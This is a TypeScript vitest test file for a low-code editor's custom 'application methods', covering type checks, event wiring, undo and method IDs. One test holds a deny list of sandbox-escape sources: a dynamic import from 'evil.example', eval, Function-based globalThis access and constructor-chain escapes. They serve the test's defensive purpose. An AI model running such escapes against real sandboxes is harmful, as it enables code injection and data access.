import { describe, expect, it } from 'vitest';
import { EditorDocument } from '../packages/editor/document';
import { compileApplication, PageRuntime } from '../packages/runtime/engine';
import {
  applicationMethodActionId,
  compileApplicationMethod,
  executeApplicationMethod,
} from '../packages/runtime/application-methods';
import { validateApplication } from '../packages/schema/validate';
import { actionExample } from '../src/action-example';
import { registry } from '../src/materials';

describe('application custom methods', () => {
  it('executes a method test payload with type validation and a minimal context', async () => {
    const result = await executeApplicationMethod(
      {
        id: 'trim',
        title: 'Trim',
        inputType: 'string',
        outputType: 'string',
        source: 'return input.payload.trim();',
      },
      '  hello  ',
      {
        signal: new AbortController().signal,
        getState: () => ({}),
        setState: () => {},
        setFormValues: () => {},
        resetForm: () => {},
        submitForm: async () => {},
        executeDataSource: async () => null,
        emitEffect: () => {},
      },
    );
    expect(result).toBe('hello');
    await expect(
      executeApplicationMethod(
        {
          id: 'trim',
          title: 'Trim',
          inputType: 'string',
          outputType: 'string',
          source: 'return input.payload.trim();',
        },
        1,
        {
          signal: new AbortController().signal,
          getState: () => ({}),
          setState: () => {},
          setFormValues: () => {},
          resetForm: () => {},
          submitForm: async () => {},
          executeDataSource: async () => null,
          emitEffect: () => {},
        },
      ),
    ).rejects.toThrow('测试输入不符合方法的 payload 类型');
  });

  it('saves shared methods in page entry and component events, then invokes them on page entry', async () => {
    const schema = structuredClone(actionExample);
    const page = schema.pages[0];
    page.state.push(
      { id: 'methodResult', type: 'string', initial: '' },
      { id: 'methodSideEffect', type: 'string', initial: '' },
    );
    schema.methods = [
      {
        id: 'format-label',
        title: '格式化标签',
        inputType: 'object',
        outputType: 'string',
        source:
          "context.setState('methodSideEffect', input.payload.label); return input.payload.label.toUpperCase();",
      },
    ];
    const document = new EditorDocument(schema, registry);
    const calls = [
      {
        id: 'call-format-label',
        action: applicationMethodActionId('format-label'),
        input: { payload: { kind: 'literal', value: { label: 'hello' } } },
        resultTo: 'methodResult',
      },
    ] satisfies NonNullable<typeof page.onEnter>;
    expect(document.setPageEnterActions(page.id, calls)).toBe(true);
    expect(
      document.setEventActions(page.id, 'external-submit', 'onClick', [
        { ...calls[0], id: 'event-format-label' },
      ]),
    ).toBe(true);
    const plan = document.getSnapshot().plan;
    expect(Object.hasOwn(plan.schema.dependencies.actions, calls[0].action)).toBe(false);
    expect(validateApplication(plan.schema, registry)).toEqual([]);
    expect(() => document.removeApplicationMethod('format-label')).toThrow();
    const runtime = new PageRuntime(compileApplication(plan.schema, registry), page.id);
    await runtime.enter();
    expect(runtime.getState()).toMatchObject({
      methodResult: 'HELLO',
      methodSideEffect: 'hello',
    });
    runtime.dispose();
    document.setPageEnterActions(page.id, []);
    document.setEventActions(page.id, 'external-submit', 'onClick', []);
    expect(document.removeApplicationMethod('format-label')).toBe(true);
  });

  it('rejects invalid JavaScript and duplicate method identities during validation', () => {
    const schema = structuredClone(actionExample);
    schema.methods = [
      { id: 'duplicate', title: 'One', source: 'return (' },
      { id: 'duplicate', title: 'Two', source: 'return input.payload;' },
    ];
    const codes = validateApplication(schema, registry).map((issue) => issue.code);
    expect(codes).toContain('method.compile');
    expect(codes).toContain('method.id');
  });

  it('rejects methods that reach host capabilities, dynamic imports or the prototype chain', () => {
    const sources = [
      "import('https://evil.example/payload.js').then(() => {});",
      'return eval("1+1");',
      'const escape = Function("return globalThis")(); return escape;',
      'return globalThis.localStorage;',
      'return ({}) .constructor.constructor("return 1")();',
      'return input.payload["constructor"];',
      'return window.document.title;',
    ];
    for (const source of sources)
      expect(() => compileApplicationMethod({ id: 'x', title: 'X', source })).toThrow(
        /方法源码/,
      );
    const schema = structuredClone(actionExample);
    schema.methods = [{ id: 'escape', title: 'Escape', source: 'return window.document.title;' }];
    expect(validateApplication(schema, registry).map((issue) => issue.code)).toContain(
      'method.compile',
    );
  });

  it('keeps legitimate method sources working, including declared names that match host globals', async () => {
    const result = await executeApplicationMethod(
      {
        id: 'tree',
        title: 'Tree',
        inputType: 'json',
        outputType: 'string',
        source:
          'const parent = input.payload.node;\nreturn String(parent.label).toUpperCase();',
      },
      { node: { label: 'ok' } },
      {
        signal: new AbortController().signal,
        getState: () => ({}),
        setState: () => {},
        setFormValues: () => {},
        resetForm: () => {},
        submitForm: async () => {},
        executeDataSource: async () => null,
        emitEffect: () => {},
      },
    );
    expect(result).toBe('OK');
  });

  it('supports application method authoring commands and keeps updates undoable', () => {
    const document = new EditorDocument(actionExample, registry);
    const id = document.createApplicationMethod('审核流转');
    expect(document.getSnapshot().plan.schema.methods).toContainEqual(
      expect.objectContaining({ id, title: '审核流转', source: 'return input.payload;' }),
    );
    expect(document.updateApplicationMethod(id, { source: 'return { ok: true };' })).toBe(true);
    expect(document.getSnapshot().plan.schema.methods?.[0].source).toBe('return { ok: true };');
    document.undo();
    expect(document.getSnapshot().plan.schema.methods?.[0].source).toBe('return input.payload;');
  });

  it('creates the complete method in one undo step and rejects invalid drafts without publishing', () => {
    const document = new EditorDocument(actionExample, registry);
    const before = document.getSnapshot();
    const draft = {
      title: '整理名称',
      inputType: 'string',
      outputType: 'string',
      source: 'return input.payload.trim();',
    } as const;
    expect(() => document.createApplicationMethod({ ...draft, source: 'return (' })).toThrow();
    expect(document.getSnapshot()).toBe(before);
    const id = document.createApplicationMethod(draft);
    expect(document.getSnapshot().plan.schema.methods).toEqual([{ ...draft, id }]);
    document.undo();
    expect(document.getSnapshot().plan.schema.methods).toEqual(before.plan.schema.methods);
  });

  it('does not give a newly created method the identity of a deleted or undone method', () => {
    const document = new EditorDocument(actionExample, registry);
    const first = document.createApplicationMethod('原方法');
    document.removeApplicationMethod(first);
    const second = document.createApplicationMethod('新方法');
    expect(second).not.toBe(first);
    document.undo();
    const third = document.createApplicationMethod('另一方法');
    expect([first, second]).not.toContain(third);
  });
});
